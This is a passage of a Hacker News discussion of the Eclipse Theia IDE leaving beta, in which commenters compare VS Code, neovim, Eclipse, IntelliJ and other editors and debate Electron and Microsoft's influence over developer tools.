may be some manual steps needed (meaning that they don't just work). It's true that the most popular extensions work fairly well though. reply satvikpendem 4 hours agorootparentprevYep, I routinely get breaking changes with my neovim config, so I now keep both VSCode and neovim installed. reply gradientsrneat 2 hours agorootparentI keep hearing of bugs and breaking changes in neovim, with no sign of it affecting the upstream vim. I am a little frustrated that neovim could give people a bad impression of vim from a stability/compatibility standpoint. Unlike emacs and atom, where you can modify the editor fundamentally, vim is extended with sandboxed scripting language(s) (I assume the same is true with neovim as well), so there's no fundamental reason why an update should break your plugins. Conflicts can occur due to overlapping hooks, but VSCode has the same problem. To be clear, I'm not suggesting people switch their text editor. Would love to hear from a more seasoned vim user if I'm missing some egregious stumbles in vim's updates that affected their workflow. reply phaedrix 1 hour agorootparentprevI've been using vim and neovim for over 15 years with many 10s of plugins and I can probably count on one or two hands when an update has caused problems. Also use Arch for about as long. It's so odd to me when someone says that updates break their vim or Arch frequently. reply ReleaseCandidat 11 hours agorootparentprev> VS Code does have flaws, but having limited extensions is not one of them, IMO. Exactly. Of course as somebody who writes extensions I'd sometimes like the possibility to change stuff at a \"deeper\" level - like having multi-line text decorations. But as a user I really prefer the model to the Emacs' one. Emacs (and I guess *vim) works best if the user writes all the code themselves. reply dmix 13 hours agoparentprev> I suspect microsoft made some intentional design decision to make this harder to do in VS code's apis, That's probably giving how software is made at these orgs too much credit. reply sporedro 20 hours agoprevIs there actually any point in using it? My initial thought was they would allow a more “atom” approach while still keeping all the vscode functionality. But it looks like it’s aimed more for “building your own IDE” without having to start from scratch, feels just like the old eclipse. Maybe I’m missing something but why would anyone bother using this? reply fbdab103 19 hours agoparentI am becoming increasingly concerned with my reliance upon VSCode. With Microsoft's increasingly visible dark-pattern shenanigans, it feels inevitable that eventually the other shoe is going to drop. A few design decisions of the platform seemed designed to make it difficult to go elsewhere, and Microsoft keeps changing default plugins away from the fully open source versions to the Microsoft quasi-kinda-pinky-swear-open source variety. Which deprives the open source versions of mind share and development resources. reply noduerme 16 hours agorootparentI very, very reluctantly switched from Eclipse to VS Code a couple years ago, because certain Eclipse plugins I relied on were no longer maintained. VS is pretty good, but I've never been comfortable with its place in the MS ecosystem, and I worry too about it turning to free-to-pay junk down the line. At least with Eclipse you really could just download and run years-old versions if you wanted to keep your particular plug-ins and favorite setup working. reply dmix 13 hours agorootparentThese editors are as much the sum of the plugins and the community around it, not simply the editor itself. Otherwise Vim/Emacs wouldn't have survived as long. Microsoft probably knows it has to play it safe. As much as there are a few bigger name commercial/close sourced ones the average dev is using 20 other niche ones run by volunteers. reply seltzered_ 13 hours agorootparentprevThere was a decent critique from a couple years ago on this, not sure how relevant it still is: https://ghuntley.com/fracture/ (HN Discussion: https://news.ycombinator.com/item?id=32657709 ) (Aug 2022) reply Asraelite 9 hours agorootparentprevI've been using the Cursor editor recently. Unfortunately it's based on VS Code, is closed source, and is tightly coupled with Microsoft/OpenAI. But the full AI integration blows everything else I've used out of the water. I feel significantly more productive with it than any other editor. I think in the coming years as LLMs become more powerful, the productivity gap between using AI to code and not using it will only increase. It will become difficult to justify not using AI, despite the privacy concerns. I really hope that open source alternatives can keep up and provide viable alternatives to editors like Cursor. reply devbent 2 hours agorootparentCursor is amazing, and you can now use Claude as the backing AI instead of OpenAI, if you so wish. reply catgary 19 hours agorootparentprevI’m ready to switch over to fleet for my ML/data science work load once they support plugins (so I can use Ruff) and Jupyter notebooks (the notebooks are mainly for debugging). reply claytonwramsey 19 hours agorootparentFor now, you may want to use VSCodium [1], which is a variant of VSCode which doesn't ship any non-free components (and also doesn't include Microsoft telemetry and such). [1]: https://vscodium.com/ reply yjftsjthsd-h 18 hours agorootparenthttps://github.com/VSCodium/vscodium/blob/master/docs/index.... > Even though we do not pass the telemetry build flags (and go out of our way to cripple the baked-in telemetry), Microsoft will still track usage by default. reply johnisgood 6 hours agorootparentWhat is meant by \"usage\"? reply goosejuice 11 hours agorootparentprevI don't find vscode sticky at all. Now cursor, they have something no one else has and sadly it's a codium fork. reply toprerules 19 hours agorootparentprevI mean, what's holding you back from using neovim? Great plugins, same LSPs, anything that's missing you can code up yourself in Lua, works over ssh... what are you really gaining by using VSCode? reply wilsonnb3 16 hours agorootparent> what are you really gaining by using VSCode The out of the box experience is vastly superior to neovim, you have to configure a lot less stuff. The default keybindings are not esoteric. Adding support for a new language is just clicking a button to install the extension, you don't have to configure or install the LSP yourself (or even know what an LSP is). For me personally, better support for c#/.net. You can make a nice IDE with neovim and plugins and a GUI but you do have to make it, whereas you just have to install vscode and you are done. reply oxidant 16 hours agorootparentAstronvim[0] is plug and play. Easy to add LSPs (Mason), easy to add syntax highlighting (TreeSitter), and easy to configure (Lua, no JSON). I can't stand VSCode due to personal preference [1], but I won't fault someone else using it. If configuration is stopping you from using neovim, use Astronvim or another pre built solution. [0] https://astronvim.com/ [1] my main beef is lack of support for my ingrained Jetbrains shortcuts and the find window being in the sidebar. How anyone can use the search results easily is behind me. I know you can move it, it's just annoying. reply mark38848 12 hours agorootparentI use astronvim and still don't know how to get Purescript to work. reply asabla 12 hours agorootparentprev> For me personally, better support for c#/.net. I feel this one. Especially if you want to do anything with razor pages and/or Blazor. It's still workable. But the experience is far from VS Code and Visual Studio sadly reply goosejuice 11 hours agorootparentprevLazyvim is pretty plug & play with room to grow. Zed and helix are good off the shelf alts. I think the days are pretty far gone for having to really do much work to have a nice nvim setup reply dmix 13 hours agorootparentprevAs a long time neovim users and promoter, I switched because of community support of plugins. More of them, they are up to date with libraries immediately (important in JS more than other languages), and easier to google solutions. Also I tried switching to Astrovim so I spent less time maintaining my vim config and it ended up breaking as often as atttempt at switching to Linux distros (regardless of years of experience) so I chose stability. reply walterlw 8 hours agorootparentprevi'm a Python main trying out neovim (using kickstart) and couple of weeks in my journey is a bit frustrating as switching between virtual environments is a hassle, jupyter notebooks aren't quite useful outside the browser and setting up the dap has been a challenge. Setting up a fresh vscode install with all of the plugins 'launch.json's and takes me ~20 minutes at this point. Not giving up on neovim as telescope, treesitter and the no-electron experience are a joy reply fastasucan 4 hours agorootparentThe seemingly lack of support of jupyter notebooks was the thing that kept me from giving it a honest try. I want the same experience as in the code editor. reply osigurdson 17 hours agorootparentprevneovim is quite a step change from normal keyboard and mouse type editors. I agree though, I think it ultimately everyone will be a neovim chad. reply alwillis 18 hours agorootparentprevThere are plenty of GUIs for Neovim [1]. [1]: https://github.com/topics/neovim-guis reply jmkni 12 hours agorootparentprevHonestly it's the learning curve I love the idea but when I try and use it, my productivity goes through the floor, and I've got work to do reply aniviacat 18 hours agorootparentpreva gui reply MobiusHorizons 18 hours agorootparentSure, but how concretely does that hold you back? Not saying I can’t imagine any possibilities, but guis aren’t universally better for editing text. In fact I usually find the gui is what is holding me back, since I end up needing access over ssh/mosh or easier access to a terminal, and tools such as tmux provide much better (imo) ergonomics than I get with terminal-in-ide especially with the ability to zoom one split to fullscreen. reply fastasucan 4 hours agorootparent>but guis aren’t universally better for editing text. Many of us use the code editor for a lot more than strictly editing text. reply spoiler 17 hours agorootparentprevI honestly don't remember the last time I used a terminal to edit files. I don't really miss vim that much since I still use vim shortcuts in VSCode. I briefly tried Emacs but a lot of the major modes for languages I used were too buggy and those were distracting me too much for it to be my daily driver (maybe I have ADHD, dunno) For what its worth, VSCode also works over SSH. There's a collection of plugins for working remotely or in containers. The main thing that drew me to VSCode originally was pretty good support for fonts and ligatures. And I think I also like some of the QoL plugins I use. The config is just JSON, and it's pretty easily tweakable to how I like it. I've heard good things about nvim and zed though, and I'm tempted to try them. But there's a bunch of idiosyncrasies and quirks that you get used to, so switched kinda feels like a chore reply bitwize 19 hours agorootparentprevOK, now I'm really glad that Visual Studio Code was one of those \"eh, pass\" things for me (like GNOME) and I stuck it out with Emacs all this time. Microsoft's play appears to be soup-to-nuts control over every aspect of web developers' work -- from finding a job (linkedin) to source control (github) to libraries and dependency management (npm). Visual Studio Code fits neatly within this play. Windows may have lost web devs' hearts and minds in the 2000s-2010s, but Microsoft has pivoted to where they don't need Windows in order to capture the developers. Wait till Pluton takes hold in a few years, and you need a Microsoft account just to get to the bootloader. reply richardw 19 hours agoparentprevMy read was different. That this is an IDE with plugins and whatnot, and they have a similarly named but entirely different offering: “Note that Eclipse Theia IDE is a separate component from the overall Theia project's related Eclipse Theia Platform, used to build IDEs and tools based on modern web technologies.” No idea why they didn’t brand them differently. The base is different (built more on VSCode platforms and not Theia the platform), unlike old Eclipse that had a split between the base and the IDE built from that base. I think that is very confusing. reply kumarvvr 17 hours agorootparentTheia platform is the foundation to build custom IDE. TheiaIDE is one, dare I say official, implementation of an IDE on the platform. To me, that seems congruent. reply richardw 11 hours agorootparentYup, on reading the actual Theia website I realise I got it wrong. Thanks :) reply aidenn0 21 hours agoprevSince this seems otherwise unrelated to the desktop Eclipse IDE, does anyone have positive feelings about the Eclipse brand? Granted I last used it about 20 years ago, but it was a less than positive experience. reply exabrial 20 hours agoparentI use Eclipse desktop regularly. It has its quirks, as most all source software does, but it's more than sufficient to get the job done. In the same vain, I did try to learn the ins-outs of vscode and I wasn't impressed after a few months. It has about the 1/16 of the capabilities of Eclipse, and things are very broken pretty much 100% of the time, or it'll suddenly break when something auto updates. It's also, just obnoxious to use: popups, distractions that never go away, settings are in a schema-less json, and a completely incoherent user experience when you do something as minor as switch plugins. Compare that to regular ol' Eclipse, which presents a unified editing interface for every language and file type. I used IntelliJ for a brief stint and I would say it's very polished and a lot of small annoyances with Eclipse it doesn't have, and it exceeds Eclipse in several areas, but not to the point where I would go relearn an entire tool. So yeah... I'll probably just stick with Eclipse until I can't anymore! reply exabrial 27 minutes agorootparentAs an example: We have a build for a giant xyz customer system. Every part of the codebase is modern; it has thousands of JUnit5 test cases, 26+ modules. We've set the build up \"correctly\": following Maven best practices and it turns out, when you follow them, things are really quick with builds just under a few minutes. Eclipse does an amazing just handling a project this size. It also is able to do things VsCode simply cannot do. We had a enum we needed to move from a submodule to a a global one. Eclipse found all of the references, including ones in our documentation, strings, test cases, and even prop files for runtime config, and refactored the whole thing in a few clicks. We've had the same experience with IntelliJ actually too, where the tools are even more refined. Eclipse/IntelliJ are on a different plane. VsCode does have it's merits, but it's not really a full blown IDE. reply constantcrying 10 hours agorootparentprevI have never used an IDE more opaque than Eclipse, you can feel the crusty Java code everywhere. I don't particularly like VSCode, but your criticisms are simply not true (anymore). It has GUI settings, it is pretty stable and you can make things go away. reply exabrial 38 minutes agorootparentI was speaking about my experience 8 months ago, so... yeah. reply peterashford 10 hours agorootparentprevIntellij, Resharper et al are Java IDEs and they're the best in the business reply EVa5I7bHFq9mnYK 5 hours agorootparentReSharper is written in C#, not Java. reply neonsunset 5 hours agorootparentprevRider has the shared \"IDE\" part with IntelliJ and others, written in Java, but the back-end and numerous other components are written in C#. reply thiht 6 hours agorootparentprev> and things are very broken pretty much 100% of the time, or it'll suddenly break when something auto updates. It's also, just obnoxious to use: popups, distractions that never go away, settings are in a schema-less json, and a completely incoherent user experience when you do something as minor as switch plugins That’s… extremely far from my experience with VSCode, are you sure you’re even talking about VSCode? I’ve literally never had anything break after an update, not even a plugin. Not saying it doesn’t happen, because it definitely does (every version is followed by 1 or 2 patches in the following days), but it’s usually about pretty niche breakages. All popups and toasters have a cog wheel on the top right that let you tell them to never show up, if you wish. And to be fair, there are very few, the only ones that come to mind are \"oh I know this file type; do you want to install the appropriate extension?\", which is honestly a welcome hint (that you can disable globally if you don’t like it). What you call \"distractions that never go away\" I’m not sure, because almost everything in the UI can be hidden. What do you think count as a distraction? Regarding the settings, it’s plain wrong. The settings have had a visual editing interface for years, and the underlying JSON is definitely typed. If you add a key that doesn’t exist, it’ll be greyed out. Invalid values have a red squiggle. I have no idea what you mean with \"incoherent user experience depending on plugins\", specifically because the extension API doesn’t let extensions do incoherent stuff. reply hobs 20 hours agorootparentprevYeah, I was lucky that early in my career a swdev turned me onto intellij stuff, it's sometimes second best at stuff and sometimes the bugs are 10 years old with no fixes in sight, but it still feels way better all the time than vscode. reply elric 12 hours agoparentprevI still use the Eclipse IDE on a daily basis for Java development. I like it a lot better than the alternatives. A lot of people seem to prefer IntelliJ's expensive bloatware, but that just doesn't do it for me. I will repeat my usual complaint: I wish the Eclipse Foundation would invest more into making the IDE better, and I wish they would make it easier for people to contribute to it. reply brabel 12 hours agorootparent> IntelliJ's expensive bloatware I am pretty sure the free Community Edition is still much better than Eclipse. reply pjmlp 1 hour agorootparentMaybe when they finally support JNI development instead of sticking us with a CLion license. That, an incremental Java compiler that isn't just using the one from Eclipse, not indexing every couple of minutes, and no 10 finger chord shortcuts. reply ayewo 11 hours agorootparentprevIs there really an IntelliJ iDea (Ultimate) Community Edition outside of Android Studio? I’ve also tried to use their products but by the time I need to, my 30-day has already expired so I just stick with Eclipse and VSCode. reply Kwpolska 11 hours agorootparentThere is \"IntelliJ IDEA Community Edition\", completely free forever. It's missing a few features compared to Ultimate, most notably the web development bits. reply pledg 11 hours agorootparentprevUltimate is paid, community is separate. You still get plenty https://www.jetbrains.com/products/compare/?product=idea&pro... reply Kuraj 10 hours agorootparentprev> IntelliJ's (...) bloatware This isn't something I hear everyday. Care to explain? reply mark38848 12 hours agorootparentprevI mean you still use Java, so you seem to really like sticking to your tools! reply lelanthran 20 hours agoparentprev> Since this seems otherwise unrelated to the desktop Eclipse IDE, does anyone have positive feelings about the Eclipse brand? I do. It was used as the basis for code-sourcery, which was the foundation for many a vendors embedded toolkit. More recently, I used it for ESP development, and I was absolutely floored that Eclipse is, in 2024, a lightweight and featureful alternative to VSCode. My prior memories of Eclipse was that, once started, it would slow my machine to a crawl. Now it runs lighter than the most popular \"modern\" editors; after doing the ESP project, I noticed just how laggy VSCode is. It could do with a few plugins, though. Copilot, and things like that. reply democracy 9 hours agorootparentCopilot works fine on eclipse reply lelanthran 6 hours agorootparent> Copilot works fine on eclipse TIL :-) reply AshamedCaptain 20 hours agoparentprevIt's ridiculous how bloated Eclipse used to be perceived, and how lightweight it is now compared to VS Code. Eclipse can run on a 256MB Java heap... reply bitwize 18 hours agorootparentEclipse seemed to me to be a \"substrate for Eclipse plugins\" first and foremost, whereas both NetBeans and IntelliJ struck me as \"tools for writing code\" first. reply seabird 13 hours agoparentprevThe IDE is pretty damn good. Plenty of shitty parts but all said and done, VS Code can't even scratch the way that I can rearrange the UI to fit everything I need to see when doing firmware development, at least not without a lot of screwing around. Really not looking forward to VS Code wiping it out in the next 5-10 years. reply itronitron 9 hours agoparentprevYes, very positive, I've used Eclipse for many years, primarily for Java. I also have a license for IntelliJ but how it does code completion and other aspects of it's UI have always irritated me. So I'm back to Eclipse, and will probably check out Theia as well. Hopefully they add Go support if it isn't already there. reply makeitdouble 19 hours agoparentprevI think the negativity should be towards Java and its sluggishness when it came to desktop applications. Eclipse was the effort that made it decent, and it took a long time before we had IDEs that were competitive for some languages. I remember the php extension being surprisingly good. reply sam_bristow 19 hours agorootparentMost of _my_ negativity towards Eclipse is all the shit-tier tools built on top by embedded software vendors. reply tonyarkles 16 hours agorootparentSigh... I'm with you here. Like yes it's pretty cool to be able to configure your pinmux and peripheral clocks and all that directly from the IDE and have it end up as source in your project. But no it's not cool to not have a supported way to do a command-line build. reply AtlasBarfed 20 hours agoparentprevI once used eclipse c development tools to hack frogcomposband to my whim and desire, it was a decent experience for \"free\" reply InfiniteRand 20 hours agorootparentEclipse is reliable decent for a wide variety of needs - that’s ultimately its selling point reply mark38848 12 hours agorootparentIt has no \"selling\" points. If it had any pecuniary cost nobody would use it. reply paulddraper 19 hours agoparentprevSome more details would be nice. What made it less than positive? reply IshKebab 12 hours agoparentprevYeah I agree. Eclipse was overall a bad experience and I think most people saw it the same way so it does seem odd to reuse the brand. I mean the people involved in Eclipse obviously like Eclipse so they probably don't realise. The thing I hated most was the workspace concept. I don't want to put all my projects in one directory or have to make a workspace just to open a project. In every other IDE you can just open a project without weird and confusing restrictions. It also crashed quite a lot - not fully, you just get a dialog box saying there was a null pointer exception. Also every app I've used that has been based on Eclipse has been awful. Teamcenter was probably the worst. So slow you could literally watch it drawing widgets. The one positive I will say is that there's a state machine plugin that's really good, and it uses the Eclipse Layout Kernel which is so good at layout out diagrams that it's been ripped out of Eclipse and even converted to JavaScript. reply curiousdeadcat 20 hours agoprevI've been following Theia for years (hi GitPod people), though mostly lost interest when vscode started being browser accessible, and back when they were using that old UI stack. But I'm confused, how does this compare with code-server, or openvscode-server? I use the latter in a web browser to do fully remote dev on my beefy machine hooked up to Google Fiber. It kind of seems like this isn't something I need to consider, unless I wanted to ship my own custom white-labeled IDE. (Which... Nah, and why?) reply cbxyp 20 hours agoparentbecause the tooling for VS code extensions to be part of the VS code UI is lackluster. It shoehorns people and prevents the development of something like a fully integrated SQL workbench. Or a form editor. Or reusable property panes, editor widget UI. If vscode had those things, it would be a proper IDE. Take for example this outline view: https://raw.githubusercontent.com/eclipse-theia/theia/master... - not something that would be easy to integrate into VS code as an extension. Very nice work. Why VS code doesn't have it is probably related to cannibalizing other MS products. reply basil-rash 19 hours agorootparentOdd example - VS Code already has an outline view, and it’d be very easy to build one yourself as an extension if you wanted. (TreeViewProvider API). With the addition of Webview Editors and Views there’s not really anything an extension can’t do to its UI. Notice this is very different from saying there’s not much an extension can’t do to VS Code’s UI. Extensions are given a box, and they gotta stay in it. Personally, I’m fine with that. reply thiht 11 hours agorootparentprevThe outline view has been part of VSCode for years though reply bogwog 16 hours agoprevUsed this recently and liked it. I don't use VS Code but I see how this is a valuable addition to the ecosystem. Not only does it provide an actually open alternative independent from Microsoft, the project has produced open-vsx.org as an open registry for VS Code + Theia compatible extensions. Also, the main focus of Theia (and Eclipse in general) is to provide a framework/base for creating a custom IDE product, not necessarily to provide a working IDE out of the box. This means e.g. companies providing custom IDEs for their embedded platforms can now use a more modern VS Code style base instead of the ancient Eclipse desktop editors. reply seltzered_ 13 hours agoparent> \"The main focus of Theia (and Eclipse in general) is to provide a framework/base for creating a custom IDE product, not necessarily to provide a working IDE out of the box.\" Yep. An important repo Theia has is the 'Theia Blueprint' repo so one wanting to make a custom IDE has a good place out of the box to start. FWIW, I prototyped gluing together existing plaintext accounting tools (Beancount, Fava, vscode-beancount) under Eclipse Theia a while back [0]. The potential of using a vscode-style base still seems a promising for certain applications but there's a learning curve to figuring out how the various dependencies and quirks of building an electron app work. [0]: https://github.com/seltzered/beancolage reply appplication 15 hours agoparentprevCompetition is good, and I haven’t used this yet so I’ll withhold judgement on this. But my experience with vscode hasn’t been particularly nice, so my enthusiasm for it as a base is a bit mixed. I’ve found it to be pretty slow and often buggy for e.g. syntax highlighting, when compared to something like pycharm. It’s likely I’m just an idiot who doesn’t know how to set up my extensions/config, but if it takes some high level of intellect to do so then I think it’s still fair to call it a poor UX. reply dang 20 hours agoprevRelated: Theia: Cloud and Desktop IDE - https://news.ycombinator.com/item?id=22792258 - April 2020 (183 comments) Eclipse Theia 1.0 – Open-Source Alternative to Visual Studio Code - https://news.ycombinator.com/item?id=22738607 - March 2020 (147 comments) Theia: A cloud and desktop IDE framework implemented in TypeScript - https://news.ycombinator.com/item?id=19466001 - March 2019 (12 comments) Theia – One IDE for Desktop and Cloud - https://news.ycombinator.com/item?id=14687858 - July 2017 (58 comments) reply lsllc 19 hours agoprevFor me at least, tree-sitter + LSP support is a must in any editor/IDE. Recent entrants like Zed are setting a very high bar along with really quite stellar updates to neovim and emacs in the form of LazyVim, Doom/Spacemacs etc. Glad to see more competition in the space. reply sureglymop 9 hours agoparentI agree. In neovim It's lately been fun to make my own tree sitter based scripts. For example, I managed to very quickly add syntax highlighting to my own DSL that is embedded in rust strings. And to counter the old trope that one ends up spending more time tinkering with the editor than being productive, it is just fun and that's enough of a reason to do it :) Can't wait to try out zed more once it becomes more stable on linux. reply greatgib 9 hours agoprevI'm so annoyed at the fact that there is almost no more competition in the field with everyone using and relying on the same core (Monaco) under Microsoft control. In addition, the editor is ok but not particularly good. Sadly a lot of users are liking it because they never really experience something different. Even if not perfect, I would recommend Kate and kdevelop that are incredible once you know how to use them reply surgical_fire 10 hours agoprevThat's looks pretty cool. I'll try replacing VS Code with it and see how it works for me. reply NonEUCitizen 18 hours agoprevWhat does this do that VS Codium does not? Why did it take seven years of work? reply w10-1 10 hours agoprevWith VSC, the only extensions are those MS builds API's for. It's hub and spoke integration, for a few big leaders and many tiny followers. With Eclipse (Theia or otherwise), it's fully open, with a large number of medium-sized groups. There's much more flexibility, but more opportunity for integration trouble (and more appreciation for those who do it right). The ecosystem has benefited from Java's open-sourcing and becoming the default organization e.g., for jakarta, but it never really recovered from the loss of IBM as the big dog driving enterprise (or the transition to Eclipse 4 style UI's). reply JasonSage 20 hours agoprevEclipse Theia IDE is to Eclipse as Visual Studio Code is to Visual Studio? I think the naming is much less interesting/important than the idea, but lots of folks seem only interested in whether the name is good or bad. In my experience, a good project tends to eventually live by a good name, and the early focus should be on the outcome. It looks to me like the folks behind this project know exactly what they’re doing. reply ryanmccullagh 17 hours agoprevFinally. VScode is a landing zone for malicious extensions. reply orbital-decay 16 hours agoparentWhat makes this one different though, besides being controlled by a non-Microsoft entity? Do they have some policies/mechanisms in place to prevent supply chain attacks? reply airstrike 20 hours agoprevFirst thing I thought is \"damn, that looks a lot like vscode\" reply ilrwbwrkhv 19 hours agoprevCan people stop using electron for editors? This is why software quality is dropping. People are ok with shoddy slow bloated apps as their primary editing interface. reply mdasen 19 hours agoparentI dislike Electron as much as the next person, but I think a big part of the issue is that there really aren't great cross-platform options out there and it's hard to keep a consistent UX across platforms if you're reimplementing things for each OS. I guess I'd ask: what would you (or other people here) use? There really isn't one that offers a great native experience cross-platform. Flutter won't ship Chromium, but it'll bring along its own runtime, widgets, and rendering engine rather than using what's provided by the OS. .NET MAUI uses native widgets, but it's difficult to create one API that uses native widgets on different operating systems given that there are subtle differences between similar widgets on different operating systems. MAUI Blazor Hybrid solves that issue and doesn't ship Chromium, but you aren't getting native widgets. I think for an editor to be successful, it needs to be available on Mac, Windows, and Linux and it's really hard to maintain parity if you're developing the UX separately. As I said, I'm not an Electron fan, but it does allow for easy parity across platforms. In this case, the reason it's Electron is that it's not just meant to challenge VS Code, but it's essentially the same codebase as VS Code - like how Edge is the same code base as Chrome. The point of the project was a VS Code that was truly free software rather than an open source core with a bunch of Microsoft stuff around it. reply pjmlp 1 hour agorootparentAs someone that is programming since 1986, wrote software across multiple 16 bit platforms, and has his own share of Web and desktop development experince, it is more like people aren't willing to put in the effort, more than anything else as lame excuses. reply Kuraj 10 hours agorootparentprevIf .NET is an option (since you mentioned MAUI) I would have gone with Avalonia. It's like WPF, which was used for Visual Studio, except it's cross-platform and can target Windows, macOS, Linux, web, iOS, Android (and from what I can tell, even TV). Personally I've had nothing but a great time with it. reply dualogy 12 hours agorootparentprev> but I think a big part of the issue is that there really aren't great cross-platform options out there and it's hard to keep a consistent UX across platforms if you're reimplementing things for each OS All that's needed is taking TextAdept or KDevelop or Kate (these are all cross-platform already) or some such editor code-base as a starting point and (A) bringing in VSCode's NodeJS-based extension host and (B) implementing out VSCode's surface extension APIs against that native backing mature editor code-base. Voila, all the great VSX extensions out there are salvaged and ready to use, with no more Electron or MS dependency. Quite icky and boilerplatey though, not as sexy as starting yet-another-whole-new-editor from scratch... plus the whole latent \"ever-having-to-keep-catching-up-to MS VSCode\" responsibility ... no wonder no one's on it. Neither am I. VSCode's extension APIs' restrictions wrt GUI extensibility are a god-send to any theoretical alternative implementors of those APIs. It's just that there aren't any =) reply tored 9 hours agorootparentprevIt exist cross platform GUI frameworks that is maintained by much smaller organizations than Microsoft, if they can do it, Microsoft can do it too. reply AshamedCaptain 19 hours agorootparentprev> It's hard to keep a consistent UX across platforms if you're reimplementing things for each OS. Funnily, I thought that was the point. reply rad_gruchalski 18 hours agorootparentWhat is the point? Reimplementing things for each OS to make it hard to keep a consistent UX across platforms? reply trealira 18 hours agorootparentI think they're saying that the point of each OS having different UI frameworks is so that all apps on that particular OS have a cohesive aesthetic and \"feel native.\" That necessarily contradicts the desire to have the same UX across various OSes, however. (And I think \"feeling native\" is something no popular programs have done for a long time.) reply nsonha 13 hours agorootparent\"Feeling native\" is overrated. Most users want a fast reponsive UI, THAT kind of \"native\". They could not care less if this app is different from that app (they are 2 apps, duh). They would feel annoyed though if the same app has different UIs because someone at Apple or Microsoft's has some opinion about UX reply Kuraj 10 hours agorootparentI don't know about that. Cohesive is important but what's also important is playing nice with the respective OS's design guidelines. For example, take dialog boxes and the order and positioning of \"OK, Cancel\" buttons. reply bitwize 1 hour agorootparentprev> \"Feeling native\" is overrated. Most users want a fast reponsive UI, THAT kind of \"native\". We seem to have forgotten it now, but back in the day we had this idea that a platform should have a standard UI to which all applications conform, so that the user can transfer knowledge in using one application to all the others, and they don't have to memorize a dozen different ways of operating to use a dozen different applications. To that end, dating all the way back to 1984, Apple developed user interface guidelines that specified things like how dialog boxes were to be laid out, what the various menus and options should be, and what were the keyboard shortcuts for common operations. This was the revolution that enabled all sorts of creatives to integrate computers into their creative work, and for the longest time it was Apple's advantage in the marketplace. Mac users, many of whom were creatives in the print, graphic design, music, and film/television spaces, were very picky about their UIs because they spent so much professional time in them. If you did not conform exactly, down to the pixel, to Apple's user interface guidelines, the users would notice right away, and you would be one-moused so hard in MacWorld your business might never recover. (That's another quasi-lost thing about the Mac ecosystem: people liked paying for good quality software.) Accordingly, it was accepted dogma to never, ever, ever use a \"cross-platform UI framework\" if you targeted Mac, because the cross-platform frameworks never got the fine details right, and the fine details mattered. It's called \"polish\", and it's something the open source world never got (thanks in no small part to fucking X windows and all its stupid \"toolkits\"), and now that open source and the web have eaten everything, the rest of the programming world has forgotten. reply cageface 12 hours agorootparentprevI think Zed is promising but they had to implement their whole UI from scratch in Rust. reply aniviacat 20 hours agoprevOn the Eclipse Theia IDE download page [0] it still says: >NOTE: The Eclipse Theia IDE is currently in beta. Does \"exits beta\" mean that it will at some point in the future exit the beta? I understood it to mean that it is out of beta today. [0]: https://theia-ide.org/#theiaidedownload reply nusaru 19 hours agoparentYeah, here's a quote from the 1.50 release post last week: > Although Theia IDE is still in beta, the steady progress suggests that we will soon be exiting the beta phase. reply LoganDark 16 hours agoprevLooks like VS Code. They copied the bad design. reply brabel 12 hours agoparentEven JetBrains, which makes actual good IDEs, is copying VSCode with its new editor, Fleet... And even the new IDEA UI (which is still opt-in, thank god - I tried it but moved back because the \"old\" UI is just clearly more ergonomic to me) is clearly VSCode-like. reply elric 12 hours agoparentprevI rather dislike that weird side ribbon thing. Some time ago I thought I'd try and build a version without it, but that wasn't as easy as I would have liked. Maybe I'll give it another go. reply fastasucan 3 hours agorootparentYou can just disable it in the settings, quite a lot easier than building a new version without it. reply ColonelPhantom 10 hours agorootparentprevThe side ribbon of VSCode is called the Activity Bar. You can put it on top of the sidebar (making it more like a tab bar) or disable it entirely (which makes it a lot harder to open the sidebar or change the page it's on). It's as simple as right click it -> Activity Bar Position -> ... reply thrownaway561 17 hours agoprevThey really need to change the name to something else. I don't know a single person that has used Eclipse in the past and thought that it was a good IDE. I think most of us had no choice but to use it back when we did and just struggled through it. reply elric 12 hours agoparentI'm continuously amazed by these kinds of comments. I love Eclipse for Java, it's easily the best IDE I've ever used. There is no struggling. reply johnyzee 11 hours agorootparentI share your befuddlement. Eclipse is good and overall better than even paid proprietary IntelliJ. I think there is a lot of bandwagon jumping, especially with newish devs. reply fastasucan 3 hours agorootparentI think the point of the comment was how Eclipse was perceived in the past, not how good it is today. reply peterashford 10 hours agorootparentprevI've used Eclipse, Netbeans and Intellij extensively for Java dev. Eclipse is my least favourite. That said, I haven't used Eclipse in years and Netbeans has been lagging in innovation since going to Apache reply Kwpolska 11 hours agorootparentprevTry IntelliJ IDEA someday. reply alkonaut 11 hours agoparentprevAgree it does them no service using that name. It’s miles worse than IntelliJ or VS. Even if it became much better in recent years (haven’t used it for over 10) its first 10 years have many of us so many scars we’ll not go near it, and we’ll think twice about using something with a similar name or origin. I know a few who still swear by Eclipse but they are the kind that think the Linux desktop audio stack is great because it’s open source too. reply surgical_fire 10 hours agoparentprevAlthough I use IntelliJ nowadays, I was pretty happy using Eclipse during the 15+ years I used it. Eclipse just lacks the final polish of IntelliJ (which is understandable), but it is a perfectly serviceable IDE, and I wouldn't mind to use it today. reply jauntywundrkind 19 hours agoprevCollaboration capabilities are a high rank priority for me. After years of not really getting anywhere, there's been some promising movement this year, but still in long open draft form. https://github.com/eclipse-theia/theia/issues/2842 reply makmanalp 16 hours agoprevEclipse always left me with the impression that it was more interested in architecting generically extensible platforms and protocols moreso than a nice, clean, user ready tool with all the kinks worked out. I was so scarred from Eclipse and OSGI and Equinox and xml manifest files and configurations and project import that never worked properly, that I never touched anything but vim for a whole decade, until first VSCode and then IntelliJ eventually won me back over by being /so/ incredibly polished that almost everything worked on the first try and with no configuration. Judging by the other comments here, I'm not alone in thinking that that impression hasn't gone away, and they aren't helping it now. From the article: > Note that Eclipse Theia IDE is a separate component from the overall Theia project's related Eclipse Theia Platform, used to build IDEs and tools based on modern web technologies. So you got the Theia project, the Eclipse Theia Platform, and the Eclipse Theia IDE, all fully separate things. \"Ah\" they will say, \"what's so hard to understand? It's a project that works on an IDE development platform under the larger Eclipse umbrella, with which we built an IDE, but of course it has nothing to do with the original Eclipse IDE\". None of which makes me want to use it or means anything to me. When you go to https://theia-ide.org/ the big text says: > An Open, Flexible and Extensible Platform to efficiently develop and deliver Cloud & Desktop IDEs and tools with modern web technologies. Dear god, please put that stuff on theia-platform.org or something instead, and market the platform separately. I know you're proud of it, but stop telling me about it please, I'm not trying to develop IDEs, which is an extremely narrow niche. \"It can host VS Code extensions\" and \"vendor-neutral\" is pretty much the only notable things from my POV - which is a perfectly great selling point, mind you - and they bury those below the fold. There's a reason you want this: the more people use Theia, the more people will choose to use it as an extension platform. Otherwise it's 